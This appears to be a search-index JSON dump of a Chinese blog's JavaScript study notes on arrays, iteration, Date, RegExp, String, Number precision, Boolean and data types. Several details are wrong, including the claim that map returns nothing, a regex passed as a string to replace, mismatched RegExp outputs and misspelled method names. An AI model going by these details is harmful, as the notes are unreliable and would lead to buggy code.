includes('', start)： 返回true / false断言函数查找（短路判断）  find &amp; findIndex：短路查找，不存在返回undefined过滤  .some() &amp; every() ：短路遍历，返回Boolean  filter          对于引用类型，返回 false（比较地址）      变量所有元素，返回 新数组      返回值：true，将currentValue加入新数组；false，跳过currentValue      const newList = array.filter( function( currentValue, index, arr ) {\t// ...    // return currentValue % 2 === 0 返回偶数    return})// 箭头函数array.filter( (currentValue, index, arr) =&gt; current*2 )填充 &amp; 复制🚩 连接：      arr.concat()                    传值：添加到arr后面，返回新数组                    传数组：数组的每一项添加到arr后面，返回新数组                  打平：是去掉中括号 Symbol.isConcatSpreadable                arr = ['red','green']     // 不打平追加arr1 = [1,2,3]arr1[Symbol.isConcatSpreadable] = falsearr.concat('yellow',arr1) // ['red','green','yellow',[1,2,3]]     // 打平追加arr2 = [4,5,6]arr2[Symbol.isConcatSpreadable] = truearr.concat('yellow',arr2) // ['red','green','yellow',4,5,6]                          展开语法 arr[...arr, ...arr2]  🚩 复制  slice(start, end) — 提取指定位置的数据，返回一个新数组（字符串也可用）          结束位置 &lt; 开始位置，返回空数组        copyWithin(target, start, end)  （ES6 新增方法）          浅复制数组（对象复制引用）一部分到同一数组中的另一个位置，并返回它      参数说明：必须为整数                  target：指定复制序列的位置；                          负数，从末尾计算；≥arr.lenght，不发生拷贝              target在start之后，复制序列复制的序列将被修改以符合arr.lenght                                start： 开始复制元素的起始位置                          负数，从末尾计算；无值，从0开始复制                                end：结束复制元素的位置                          负数，从末尾开始计算；无值，直至数组结束                                          不会改变原数组的长度：超过长度、零长度、方向相反，不报错且不处理      🚩 替换  array.fill(value, start, end) —  固定值替换数组的元素          参数说明：必须为整数                  target：指定复制序列的位置；                          负数，从末尾计算；≥arr.lenght，不发生拷贝              target在start之后，复制序列复制的序列将被修改以符合arr.lenght                                start： 开始复制元素的起始位置                          负数，从末尾计算；无值，从0开始复制                                end：结束复制元素的位置                          负数，从末尾开始计算；无值，直至数组结束                                          不会改变原数组的长度：超过长度、零长度、方向相反，不报错且不处理      🚩 splic(start, delectNum, end) ， 改变原数组，返回处理后的数组      删除 splice(start, num) 返回删除[start],[start+1]…[start+num]，无删除的数据返回空数组        插入 splice(start,0,interItem) 从开始位置，删除0项，插入数据        替换 splict(start,num,iterItem)  转换  字符串转为数组 — 字符串具有length属性          str.split(‘指定拆分符’)      arr.from(str, mapFun)      ...\"abcd\" == ['a','b','c','d']        数组转为字符串          toString()、valueOf()、alert() — 为数组每一项调用 toString()      toLocaleString() — 每一项调用toLocalString()      join(\"指定连接符\") — 某一项是null、undefind，返回结果是以空字符串表示        对象转为数组          为对象添加length属性，key值改为数组下标相同      栈队方法  栈          push推入 — 接受任意数量的参数，逐个添加到末尾，返回修改后的数组长度      pop弹出 — 移除末尾最后一项，减少length值，返回移除项        队          push + shift — 移除第一项，减少length值，返回移除项      pop + unshift — 前端添加任意项，返回数组长度， 反方向模拟队列        展开语法： array = [...array,...hd];重排序​\t都返回调用数值的引用  reverse() ： 反转数组项顺序  sort() : 升序排列数组项          默认情况下，调用每项的toString()，比较得到的字符串，所以可能出现$ 10&lt;5 $ 的情况      可以 接受一个比较函数作为参数：      // 比较值为字符串// a&lt;b -1, a在前面； a&gt;b 1,a在后面；a=b 0,ab相等value.sort((a,b) =&gt; a &lt; b? 1 : a &gt; b? -1: 0)// 比较值为数值value.sort((a,b) =&gt; b-a)循环1. forfor(let i = 0; i &lt; arr.length; i++){}​\t同理，还有while、do…while，常用于数组遍历2. for … inlet obj = {name:'zhou',age:'**'}for(let i in obj) { console.log(i, obj[i])}  i 是对象的key值，是字符串形式，可能会发生 字符串运算  不仅仅遍历自身属性，还会找prototype上的属性；加判断obj[i].hasOwnProperty(i)，否则不遍历3. forEacharr.forEach(function(item, index),this){}let arr = [1,2,3];arr.forEach(function(i,index){ console.log(i,index)})  没有返回值  不能中断遍历（没有break语句）；使用try...catch{return}返回  只能遍历数组，不能遍历普通对象4. maparr.map(function(item, index, arr),this){}//item\t[必须],当前遍历项//index\t[可选],当前遍历项的下标//arr\t[可选],当前元素所属的数组对象let arr = [1,2,3];let tt = arr.map(function(i){ console.log(i) return i*2;})  【与forEach一样】没有返回值  不能中断遍历（没有break语句）；使用try...catch{return}返回  只能遍历数组，不能遍历普通对象5. filter​\t对于引用类型的比较，返回false，因为比较的是引用地址​\t回调函数中，返回值为 true，currentValue将加入新数组；false，跳过currentValuearr.filiter(function(item, index, arr){    // ...    // return currentValue % 2 === 0 返回偶数    return})let arr = [1,2,3];let tt = arr.filter(function(i) =&gt; i &gt; 1)// [2,3]  数组的内置方法，返回通过过滤的元素组成的新数组，不改变原数组6. some &amp; everylet arr = [1,2,3];// 【some】let tt = arr.some(function(i){ return i&gt;1;})// true, 存在一个就为true，短路判断// 【every】let tt = arr.every(function(i){ return i&gt;1;})// false, 任意一个都需要满足，否则为false，短路判断7.  reduce &amp; reduceRightarr.reduce(function(pre, cur, index, arr){}, this){}//pre\t[必须] 初始值，计算结束后返回的值，且作为下次循环调用的第一个参数//cur\t[必须] 当前元素//index\t[可选] 当前元素的下标//arr\t[可选] 当前元素所属的数组//this\t[可选]let arr = [1,2,3];let ad = arr.reduce(function(i,j){ return i+j;     //就是计算从左到右 1+2+3})// 6  reduce（从左到右）计算数组中的每一个值，最终计算为一个值。  reduceRight （从右到左）8. for … offor (variable of iterable) {    //statements}  可迭代对象（包括 Array，Map，Set，String，TypedArray，arguments 对象等等）上创建一个迭代循环，调用自定义迭代钩子，并为每个不同属性的值执行语句 9. 迭代器 iterator​\t表示”集合”的数据结构，有一个统一的接口机制完成遍历操作（依次处理该数据结构的所有成员），叫做Iterator接口。  迭代器对象的本质是一个 指针对象，使用.next()移动指针，会有两个结果          下一项，返回对象                  当前成员数据信息(value)          是否完成遍历(done — Boolean)          value:undefined + done:fale  都是可以省略的                    引起stopiteration 异常        Iterator接口在ES6规定中，定义在Symbol.iterator上          具有这个iterato属性，可以认为是”可遍历的”      调用Symbol.iterator会得到当前数据结构默认的遍历器生成的函数      Symbol.iterator本身是一个表达式，返回iterator属性      while( ({value, done} = values.next())  &amp;&amp; done === false) {}// ({value, done} = values.next()) 在括号内，先执行，获得done，判断是否已经完成迭代，避免死循环10.迭代器 entries​\tObject.entries(obj)方法  将一个给定对象obj自身，可枚举属性的键值对以数组的形式返回出来，  其排列与使用 for...in 循环遍历该对象时返回的顺序一致  （区别在于 for-in 循环还会枚举原型链中的属性）而entries不会。const obj = {'a':'3',b:'39'};let objEntries = Object.entries(obj); //[ [ 'a', '3' ], [ 'b', '39' ] ]const arr = [2,9,38,30]console.log(Object.entries(arr)); //[ [ '0', 2 ], [ '1', 9 ] ]Array.prototype.entries()方法  返回一个新的Array迭代器对象Array Iterator对象，该对象包含数组中每个索引的键/值对  Object [Array Iterator] {}  Array Iterator原型是有一个next方法，可以用于遍历迭代器取得的原数组的[key, value]const arr = [2,9]// Array.prototype.entries() let entries = arr.entries(); // 返回Object [Array Iterator] {}let {done, value} = entries.next(); // { value: [ 1, 9 ], done: false }// 数组遍历循环for(const [key,value] of arr.entries()){    console.log(`${key}+${value}`);    //0+2 1+9}清空数组  splice(0, arr.length) — 从零开始，删除至最后一个  arr.length == 0          == lenght+2， 多出来的2个元素 ，赋值为undefined      == lenght-2，减少的2个元素，后面的2个元素被删除        arr = [] — 重置引用，之前的数组等待垃圾回收  while(arr.pop()) — 非0的值，都为trueTyped Array"
  },
  
  {
    "title": "2.7.基本引用类型（Date）",
    "url": "/posts/2.7.%E5%9F%BA%E6%9C%AC%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B-Date/",
    "categories": "JavaScript, 引用类型",
    "tags": "javascriptBase",
    "date": "2022-08-10 00:00:00 +0800",
    





    
    "snippet": "日期 Date​\t\tDate类型将日期保存为 自协调世界时（UTC，UNiversal Time Coordinated）：1970年1月1日00时至今所经历的毫秒数。      创建          new Date — ①无参数，获取创建时日期时间；②或传递日期 时间的 毫秒数        若想传入指定日期的值，而不是毫秒数，有两个辅助函数：          Date.parse(...",
    "content": "日期 Date​\t\tDate类型将日期保存为 自协调世界时（UTC，UNiversal Time Coordinated）：1970年1月1日00时至今所经历的毫秒数。      创建          new Date — ①无参数，获取创建时日期时间；②或传递日期 时间的 毫秒数        若想传入指定日期的值，而不是毫秒数，有两个辅助函数：          Date.parse() — 接受字符串                  格式： ①\"mouth/day/year\" ②mouthEnglish day,year ③weekEnglish mouthEnglish day year h:m:s 时区           直接传 字符串给Date(“May 22,22”)也会调用Date.parse()          字符串不能代表日期，返回NaN                    Date.UTC(year, mouth, [day, h, m, s, ms]) — 基于本地时区                  年份、月份为必须          月份从0开始，日期从1开始，小时从0开始                      创建一个新Date对象的唯一方法是通过new 操作符，例如：let now = new Date(); 若将它作为常规函数调用（即不加 new 操作符），将返回一个字符串，而非 Date 对象。  const time = new Date();console.log(typeof time); //Objectconsole.log(time * 1);\t// 时间戳const time1 = Date()console.log(typeof time1); //stringconsole.log(time1 * 1);\t// NaN  其他操作            转化为字符串                                              普通字符串      系统区域设置格式      特殊地区时间              日期      toDateString()      toLocalDateString()      toUTCString() 全球标准时间              时间      toTimeString()      toLocalTimeString()      toGMTString() 格林威治时间      ​\t以上方法输出的时间格式因浏览器而异，不能用于在用户界面上一致地显示日期            转为时间戳                         标准时间对象 * 1      Number(标准时间对象)              标准时间对象.valueOf()      标准时间对象.gerTime()      时间戳转为标准时间对象 — new Date(时间戳)  toString 和 toLocaleString 的区别  1.当数字是四位数及以上时，有区别  ​\ttoLocaleString()会让数字三位三位一分隔  2.当目标是标准时间格式时，有区别  sd.toLocaleString()“2017/2/15 上午11:21:31”  sd.toString()“Wed Feb 15 2017 11:21:31 GMT+0800 (CST)”  查询脚本执行时间  定义标志位：console.time(“for”)  定义结束标志位： console.timeEnd(“for”)格式化时间对象function dateFormat(date, format = 'YYYY年MM月DD日 HH:mm:ss'){    const config = {        YYYY: date.getFullYear(),        MM: date.getMonth(),        DD: date.getDate(),        HH: date.getHours(),        mm: date.getMinutes(),        ss: date.getSeconds()    };    for(const key in config){        format = format.replace(key, config[key]);    }    console.log(format);    return format;}const time = new Date();let time3 = dateFormat(time)   // 2022年7月30日 17:38:48日期对象比较大小：毫秒数let lastDay = new Date()let toDay = new Date()lastDay &lt; toDay  // 距离1970年的毫秒数比较  时间封装 第三方库  www.momentjs.cm"
  },
  
  {
    "title": "2.6.基本引用类型（RegExp）",
    "url": "/posts/2.6.%E5%9F%BA%E6%9C%AC%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B-RegExp/",
    "categories": "JavaScript, 引用类型",
    "tags": "javascriptBase",
    "date": "2022-08-08 00:00:00 +0800",
    





    
    "snippet": "正则表达式 RegExp​\t声明和定义：/pattern/flages 或 new RegExp(\"pattern\",\"tage\")      tage ：          g：全局模式，查找全部内容      i：不区分大小写      m：多行模式，查找到第一行文本末尾还会继续      y：粘附模式，只查到从lastIndex开始之后的字符串      u：Unicode模式    ...",
    "content": "正则表达式 RegExp​\t声明和定义：/pattern/flages 或 new RegExp(\"pattern\",\"tage\")      tage ：          g：全局模式，查找全部内容      i：不区分大小写      m：多行模式，查找到第一行文本末尾还会继续      y：粘附模式，只查到从lastIndex开始之后的字符串      u：Unicode模式      s：dotAll 模式，表示元字符.匹配任何字符。/s出现空白就匹配； /S非空白就匹配；[/s/S]换行完全匹配            元字符转义    在RegExp构造函数中，两个参数都是字符串，所以元字符需要二次转义        实例属性：提供模式的各方面信息          global：Boolean，是否设置了g标志      ignoreCase：Boolean，是否设置了i标志      unicode：Boolean，是否设置了u标志      sticky：Boolean，是否设置了y标志      lastIndex：int，源字符串在下次搜索的开始位置，始终从0开始      multiline：Boolean，是否设置了m标志      dotAll：Boolean，是否这是了s标志      source：正则实例的pattern（字面量）      flags：标记字符串，始终以字面量而非传入构造函数的字符串形势返回（没有前后斜杠）            实例方法：exec() 配合捕获组，接受要查找的目标字符串                  存在匹配项，返回第一个匹配信息的数组；                  返回值是Array实例，但包含两个额外属性：index  和 input                          index 表示模式匹配的起始位置； input 是查找到的字符串                                Array实例，第一个元素包含 匹配整个模式的字符串，其他元素包含 表达式中捕获组匹配的字符串；如果没有捕获组，就只有一个元素                          捕获组 pattern = /妈妈(和爸爸(和孩子)?)?/gi  和 ‘妈妈和爸爸和孩子’，存在三个元素                                  array[0] = 妈妈和爸爸和孩子                  array[1] = 和爸爸和孩子                  array[2] = 和孩子                                                                                不存在匹配项，返回null                    不同的tage在exce下的表现                              没有设置全局变量，只会返回第一个匹配项，lastIndex不变；            设置了全局变量，每次调用exec都在字符串向前搜索下一个匹配项，lastIndex每次都会变化，直至末尾                                设置粘附模式，每次只会在lastIndex的位置上寻找匹配项；            找不到匹配项，exce() 返回 null，lastIndex = 0                                    实例方法： test()只在乎输入是否有效，而不在乎内容且无什么无效        构造函数方法（静态属性）：提取exec()和 test()执行的操作相关信息              $1 - $9 ：取出存储的9个捕获组匹配项        使用方法：  const pattern = /hort/g;const text = 'this has been a short summer' RegExp.input;  // this has been a short summer = RegExp.&amp;_;RegExp.leftContext; // this has been a = RegExp[$`]; //`RegExp.rightContext; // summer = RegExp[$']RegExp.$1; //'and dad and baby'"
  },
  
  {
    "title": "2.4.基本数据类型（String）",
    "url": "/posts/2.4.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B-String/",
    "categories": "JavaScript, 基本类型",
    "tags": "javascriptBase",
    "date": "2022-08-07 00:00:00 +0800",
    





    
    "snippet": "字符串 String固有属性： length属性，取长度重复输出：repeat(n)，重复n次，返回一个新字符串码元组成（U+0000 ~ U+FFFF范围内的字符）基本多语言平面（BMP) ：由16位码元（code unit）组成一个字符            函数      返回值                  charAt( index )      指定16位码元的指定位置，返回...",
    "content": "字符串 String固有属性： length属性，取长度重复输出：repeat(n)，重复n次，返回一个新字符串码元组成（U+0000 ~ U+FFFF范围内的字符）基本多语言平面（BMP) ：由16位码元（code unit）组成一个字符            函数      返回值                  charAt( index )      指定16位码元的指定位置，返回其对应字符              charCodeAt( index )      指定位置的码元值              fromCharCode( 码元1, 码元2, …)      根据数值对应字符拼接起来，返回字符串      代码对 = 基本多语言平面 + 增补平面 ：需要由另外16位码元组成，2×16=32位组成一个字符                                             codePointAt( index )      指定16位码元的指定位置，识别完整的码点                     codePointAt( index )      指定位置的码元值                     fromCodePoint( 码元1, 码元2, …)      根据数值对应字符拼接起来，返回字符串             码点（codePoint）是Unicode中一个字符的完整标识。如果传入的码元索引不是代理对的开始，就会返回错误的码点。这种错误只有检查单个字符时出现。console.log([...'abcv①']) // ['a', 'b', 'c', 'v', '①']迭代字符串可以智能识别代码对的码点编码方式​\tUnicode提供4种规范化形式：NFD(Normalization From D) 、NFC(Normalization From D)、NFKD(Normalization From KD)、NFKC(Normalization From KD)​\tString.normalize(NFD) 根据传入的模式，返回Boolean值，判断是否以规范化转换  toString()： null、undefined不能用；参数是转出数值的基数  String()：可以转任何类型          可以转化的，调用toString()      null，返回null      undefined，返回undefined      截取                   参数      正数      负数                  slice      (start, end)      [start, end)      [start, length+(-end)+1)              subString      (start, end)      [start, end)      将所有负数视为0，输出[0,start] == [start,0]              subStr      (start, strNumber)      [start, length)      第一个负参数当作length+end，之后的所有负参数都转为0start&gt;0, length&lt;=0, 返回''      检索  indexOf('') &amp; lastIndexOf('')：从0开始，不存在返回-1  includes('', start)： 返回true / false，检索整个字符串  startsWith &amp; endWith ：是否在字符串头部 / 尾部出现          start：第二个参数表示开始位置      end：第二个参数表示字符串末尾的位置        .some() &amp; every() ：短路遍历                                             指定字符的位置，不存在返回-1      indexOf(‘’)      lastIndex(‘’)              是否包含指定字符，返回Boolean      includes(“char”, startIndex)                     指定字符串是否出现在头部/尾部      startsWith(‘hello’)      endWith(‘hello’)              遍历，短路判断      .some(‘’=&gt;{}) 存在      .every(‘’=&gt;{}) 任意      替换      arr.replace(searchvalue, newValue)                  searchvalue 可以是正则表达式，也可以是字符串                    newValue 是字符串的情况下，可以使用 字符序列 ，使用之前匹配的内容：        let text = 'cat, bat, sat, fat';result = text.replace('/(.at)/g',\"word($1)\")result // 'word(cat), word(bat), word(sat), word(fat)' 返回一个字符串                            newValue 可以是一个函数，接受3个参数，可以有多个捕获组match，但最后两个参数还是与整个匹配模式的开始位置和原始字符串        str.replace(/[&lt;&gt;\"&amp;]/g,function(match, pos, originalText){    switch(match){        case \"&lt;\" : return '&amp;lt;';        case \"&gt;\" : return '&amp;gt;';        case \"&amp;\" : return '&amp;amp;';                }})                          str.reduce()          (function(...),0)： 第二个参数指定了pre的初始值不再是word/arry[0],而是第二个参数的值      pre.replace(word,)：对目标字符串中的与关键字列表相同的字段进行替换操作      数组同，可做引用引用对象等Max/Min比较            match(regexp) ： 参数与返回类型等同于exec()，返回查找位置        trim()：不影响原字符串， 删除前、后所有空格符； trimLeft()&amp;trimRight() 从开始/末尾清理空格符        padStart(targetLengh, padString) &amp; padEnd(targetLengh, padString) 复制字符串          第一个参数是目标长度；第二个参数指定填充的字符（默认为‘’ “空格0）      迭代​\tString 在原型中暴露一个@@interator方法，表示可以迭代字符串中的每个字符let message = 'abc';let stringIterator = massage[Symbol.iterator]();stringIterator.next(); [value:'a',done: false]// ... 模板字符串（ES6）​\t使用反引号定义 ​\t字符串连接： 'str1' + 'str2'1. 解析变量`${字符串1}成立与${字符串2}`2. 可调用函数：显示代码执行的返回值`www.${show()}`3. 可拼接&lt;&gt;`&lt;ul&gt; ... &lt;/ul&gt;`4. 可嵌套模板字面量,可换行、排版友好let html = `&lt;ul&gt;\t&lt;li&gt;${result.name}&lt;/li&gt;    &lt;li&gt;${result.age}&lt;/li&gt;    &lt;li&gt;${result.sex}&lt;/li&gt;&lt;/ul&gt;`"
  },
  
  {
    "title": "2.3.基本数据类型（Number）",
    "url": "/posts/2.3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B-Number/",
    "categories": "JavaScript, 基本类型",
    "tags": "javascriptBase",
    "date": "2022-08-05 00:00:00 +0800",
    





    
    "snippet": "特殊数字number的数字进制      二进制：0b        八进制：0        十六进制：0x  number的最大值最小值      最大值： Number.MAX_VALUE        最小值：Number.MIN_VALUE  无穷大 无穷小  无穷大：Infinity — 大于最大值  无穷小：-Infinity — 小于最小值  NaN，代表非数值       ...",
    "content": "特殊数字number的数字进制      二进制：0b        八进制：0        十六进制：0x  number的最大值最小值      最大值： Number.MAX_VALUE        最小值：Number.MIN_VALUE  无穷大 无穷小  无穷大：Infinity — 大于最大值  无穷小：-Infinity — 小于最小值  NaN，代表非数值          本应该返回数值的操作数，未返回操作数      NaN != NaN 不等于任何数      判断      数字的类型 Number.isInteger()：是否为整数        是否为NaN：          Number.isNaN();                  true：表示非数字，任何不能转为数值的值： NaN、”blue“          不是NaN， false                    Object.is(,NaN)            判断是否是 安全整数：    ​\t在 Number.MIN_SAFE_INTEGER （$-2^{53}+1$）到 Number.MAX_SAFE_INTEGER （$2^{53}-1$） 范围内二进制值可以表示一个整数值。超出这个范围，即使尝试保存为整数，也会保存成一个错误的完全不同的数值。    ​\t判断是否在安全范围内，可以使用 Number.isSafeInteger()，返回 true    0.1 + 0.2 ≠ 0.3 问题  转化      parseInt() 和 parseFloat()，专门为字符串转数字          忽略字符串的空格，直到找到第一个非空格字符      空字符串\"\"，没有数字字符串（如'blue'）， 转化结果为NaN      可将数字开头的字符串删去后边非字符串的部分，仅保留数字      对于Int，小数点不是有效数字字符      对于Float，第二个小数点不是有效数字字符            Number()可以转任何类型为数字，要求字符串需为数字字符串                                                                                         Boolean          true=1          false=0                          Number          Number原值                                     null          0                                     undefined          NaN                                     String          空字符串          0                                     只包含数值          十进制数                                     包含有效浮点数          忽略前置0，转为浮点数                                     包含Ox的数值          十六进制数                                     包含Ox的数值          二进制数                                     除此之外          NaN                          Object          :one: ValueOf() 转          若为NaN                                     :two: toString() 转                                     toString 接受一个表示基数的参数，返回相应基数形式的数值字符串        toFixed() toExponential() toPrecision() 调整小数位精确表示数值：          toFixed()： 指定小数点位，不足用0填充；超过位数，四舍五入。      toExponential()：科学计数法，指定小数的位数。99.toExponential(1) = 1e+2      toPrecision()：根据数值和精度决定调用toFixed()还是 toExponential()      Number对象 &amp;Number值​\t存在着和 Boolean 同样的问题。0.1+0.2 ≠ 0.3​\t原因： 采取 IEEE-754 64位双精度 浮点数存储， Javascript、 Java 、python等语言都存在这个问题​\t一个浮点数占64个bit，由符号位（0为正，1为负）、指数部分（确定小数点在第几位）、数值部分      指数部分，使用 移码表示法          11bit 指数代表的大小 $e=2^0+2^1+\\cdots+2^{11}$，第一位 $2^0$ 为隐藏位，一定为1（规范数）      小数位置 $p = e -1023$ （1023 = 指数部分 bit 都为 1）              $p=1075-1023=52$时， 所有数值部分都被用来表示整数；52bit 全为1时，是能够表示的最大数值 9007199254740991                  $max +1 = 9007199254740992$ : 小数点向右移动一位 p=53，隐藏位（第12bit）=1，整数部分（53bit）为0 —— 第53bit 不存在只能为0                          $9007199254740992+1$ ：第53bit 无法修改为1，无法加2              $9007199254740992+2$ ：第52bit = 1， 53bit = 0（无法改变）              $9007199254740992+3$ ：第53bit 无法修改为1，无法加4              …… 以2为间隔相加                                小数点位为53，第45bit &amp; 第54bit = 0 无法改变，只能以4为间隔相加          之后的数值都无法完整表示，任何计算都会出错                            小数点位越过隐藏位（第11bit），所有数值部分都被用来表示小数；                  隐藏位固定值为1时（规范数），表示的数一直都是 $2^{-1}$ 幂次，值可能非常小，但一直有值                    指数部分的极端情况：                  符号位1、0  + 指数部分都为`0` + 隐藏位为0 + 数据部分都为0 = ±0 —— 非规范数          符号位1、0  + 指数部分都为`1`  + + 数据部分都为0 = ±infinity          符号位1、0  + 指数部分都为`1`  + + 数据部分存在1 = NaN（typeof NaN = ”number“，存在1的关系 可以有多种NaN）                          数字部分：小数位置将数值部分分为 整数和小数          小数值 $x = 2^{-1} + 2^{-2} + \\cdots + 2^{-n}$`                  并非所有小数都是可以为 $ 2^{-n}$ 直接表示          如 $0.1 \\approx 2^{-4} + 2^{-5} + 2^{-5} + \\cdots + 2^{-47}$， 51bit 只得到一个无限近似于 0.1 的值，已经存在误差          用 $2^{-n}$ 相加得到小数， 当 $p=1074 - 1023 = 51$，只留给小数值 1bit 时，只能表示 0.5                    整数部分：            数字 ±0：除符号位，其他bit = 0 ，包括隐藏位，所以是非规范数  "
  },
  
  {
    "title": "2.2.基本数据类型（Boolean）",
    "url": "/posts/2.2.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B-Boolean/",
    "categories": "JavaScript, 基本类型",
    "tags": "javascriptBase",
    "date": "2022-08-03 00:00:00 +0800",
    





    
    "snippet": "Boolean            Boolean()      true      false                  string      非空串 “ ”      “” 空串              number      非零值（包括无穷）      0 、 NaN              Object      对象      null              ...",
    "content": "Boolean            Boolean()      true      false                  string      非空串 “ ”      “” 空串              number      非零值（包括无穷）      0 、 NaN              Object      对象      null              undefined      -      undefined              数值 Array      数组（空数组）      ![]  先转为空串，再取反        隐式转换：两步取反：转换+取反+取反Boolean对象 &amp; Boolean值​\ttypeof 操作符对 Boolean值（原始值）返回 ‘boolean’，对Boolean对象返回 ‘object’​\tBoolean对象是Boolean类型的实例，而Boolean值（原始值）不是typeof booleanObject;\t// objecttypeof booleanValue;\t// booleanbooleanObject instanceof Boolean; // truebooleanValue instanceof Boolean; // false​\t在判断中转换的值不同：booleanObject &amp;&amp; false // true, object = truelet booleanValue = falsebooleanValue &amp;&amp; true // false🌞  强烈不建议使用 Boolean对象"
  },
  
  {
    "title": "2. 数据类型",
    "url": "/posts/2.%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/",
    "categories": "JavaScript",
    "tags": "javascriptBase",
    "date": "2022-08-01 00:00:00 +0800",
    





    
    "snippet": "  基本数据类型：          undefined &amp; null      number      boolean      string        基本引用类型：          原始值包装类型      RegExp      Date      单例内置对象        集合引用类型：          Array &amp; TypeArray      Map...",
    "content": "  基本数据类型：          undefined &amp; null      number      boolean      string        基本引用类型：          原始值包装类型      RegExp      Date      单例内置对象        集合引用类型：          Array &amp; TypeArray      Map   &amp; weakMap      Set   &amp; weakSet      基本和引用类型区别                   基本数据类型      引用数据类型                  声明的存储分配      栈      堆              不同的访问机制      可以直接访问到      只能操作对象在栈中的引用              复制变量时      值存放到新变量内存中      引用存放到新变量栈中，操作同一个地址              分配机制      自动分配，大小固定      动态分配，可指向同一块引用              回收机制      回收及时，生存时间固定      根据引用次数交给回收器回收      回收机制​\tJavaScript的执行环境在代码执行期间管理内存：确定哪个变量不再使用，回收它并释放内存。周期性执行。​\t最主要的标记策略：标记清理和引用计数值类型的判断  typeof： 一元运算，返回String — 判断引用类型时，只会返回object  instanceof： 判断是否在原型链上prototypeobject instanceof contructor     -- 判断object的原型链上是否存在constructor.prototype\t-- object 一定要是一个对象    -- contructor 一定要是一个函数      值定义：          引用类型        let number = new Number(99);number.valueOf()+1              值类型        ler number = 99;number+1;        对于值类型使用.方法时，会在原型链中调用对象的方法（转换为对象）    两者会结合封装成一个工具类function getDataType(obj) {  if (obj === null) {    return 'null';  } else if (typeof obj === 'object') {    if (obj instanceof Array) {      return 'array';    } else {      return 'object';    }  } else {    return typeof obj;  }}undefined &amp; null  undefined ：声明但未赋值  null：执行空对象指针🌞 undefined 派生自 null，undefined == null❗ 原始值包装类型​\t每当用到某个原始值的方法或属性是，后台会创建一个相应原始包装类型的对象，使得原始值具有操作属性的各种方法。​\tECMAscript提供了三种特殊的引用类型：Boolean 、Number、Stringlet str1 = new String('text string') // 原始值 str1let str2 = str1.length;  // 访问到 str1 中的属性 —— 只读的模式str2 以只读的模式访问 str1 在内存中保存的值，后台会执行以下三个操作：​\t :one: 创建String实例 :two:调用实例上的特点方法  :three:销毁实例作用域​\t引用类型和原始值包装类型主要区别在于对象的生命周期：​\t自动创建的原始值包装类型对象，只存在于访问它的那行代码执行期内。即不能在运行时给它添加属性和方法。let str1 = new String('text string') // 原始值 str1str1.color('red');console.log(str1.color); // undefined第二行代码尝试给 原始值新增属性str1.color，但第三行访问不到：  第二行代码访问到的String对象是临时的，已经被销毁  第三行代码中创建了新的自己String对象，但这个对象没有这个属性类型转换​\t可以使用Boolean 、Number、String构造函数显式原始值包装类型，但不建议let str = '30'typeof str; //'string'// 转型函数let num = Number(str) typeof num; // 'number'// 构造函数let obj = new Number(str)typeof obj; // 'object'❗ 单例内置对象​\tECMA-262中，对内置对象的定义：任何由ECMAScript实现提供、与宿主环境无关，并在程序开始执行是就存在的对象。​\t\t可以直接使用，而无需创建实例 ——无法在显性地实例化内置对象（在运行时就存在对象），包括Object、Array、String、Global、Math兜底对象 Global​\tECMA-262规定，Global对象为兜底对象，所针对的是不属于任何对象的属性和方法。在全局作用域中定义的变量和函数，都是Global的属性。​\t包括 isNan() 、isFinite() 、parseFloat() 等​\t在 浏览器中，window对象实现为Global对象的代理。所有全局作用域中声明的变量和函数都变成了window属性。URL 编码方法            encodeURL()      encodeURLComponent()                  对整个URL编码      编码URL中单独的组件              不编码属于URL组件的特殊字符      编码所有非标准字符      ​\tdecodeURL() &amp; decodeURLComponent()  同上eval 方法​\t完整的ECMScript解释器，接受一个字符串（要执行的ECMAScript语句）。运行时，才将参数解释为ECMAScript语句，并插入到该位置，调用代码所在的上下文 —— 被执行的代码与该上下文拥有同样的作用域链。​\t但定义的任何变量和函数都不会被提升：解析代码时候，ECMAScript语句仅仅作为一个字符串，只有在执行是才会被创建。​\t在严格模式下，eval() 内部创建的变量和函数无法被外部访问。必须非常慎重使用。在解释用户输入等不可控字符串时，可能被植入执行语句Global 对象属性  所有原生引用类型构造函数；  特殊值：NaN Undefined infinity；  Error构造函数；"
  },
  
  {
    "title": "1. 变量",
    "url": "/posts/1.%E5%8F%98%E9%87%8F/",
    "categories": "JavaScript",
    "tags": "javascriptBase",
    "date": "2022-08-01 00:00:00 +0800",
    





    
    "snippet": "数据类型基本和引用类型区别                   基本数据类型      引用数据类型                  声明的存储分配      栈      堆              不同的访问机制      可以直接访问到      只能操作对象在栈中的引用              复制变量时      值存放到新变量内存中，两个变量互不干扰      引用存放到新...",
    "content": "数据类型基本和引用类型区别                   基本数据类型      引用数据类型                  声明的存储分配      栈      堆              不同的访问机制      可以直接访问到      只能操作对象在栈中的引用              复制变量时      值存放到新变量内存中，两个变量互不干扰      引用存放到新变量栈中，操作同一个地址              分配机制      自动分配，大小固定      动态分配，可指向同一块引用              回收机制      回收及时，生存时间固定      根据引用次数交给回收器回收            变量声明方式，会影响其数据类型    使用new关键字会创建一个Object类型对象，其行为类似原始值  let name = 'username' // typeof = stringname.age = 18console.log(name.age) // undefinedlet name = new String('username') // typeof = objectname.age = 20console.log(name.age) // 20       传递参数时，按值传递（与复制变量一样，引用类型仅传递地址）    但在函数内部重写对象obj时，变成一个指向本地对象的指针，与外部对象断联。且这个指针在函数结束调用时，销毁掉了，对外部对象没有影响。  function setName(obj){    obj.name = 'nicholas'    obj = new Object()    obj.name = 'greg'}let person = new Object()setName(person) // person.name = 'nicholas'变量声明（es6 特性）作用域又称为“执行上下文”，每个上下文都有一个关联的变量对象（varialbe object），定义的所有变量和函数都存在与此，在后台处理数据时可以读取到。上下文在其所有代码都执行完毕后会销毁，包括定义的变量和函数。全局上下文是最外层的上下文，根据ECMAscript实现的宿主环境不同，表示全局上下文的对象可能不一样。在浏览器中，全局上下文指“window对象”。只有在退出浏览器或关闭页面时，window对象会销毁。ECMAscript程序执行流通过上下文堆栈进行控制。上下文执行代码时，创建变量对象的一个作用域链(scopt 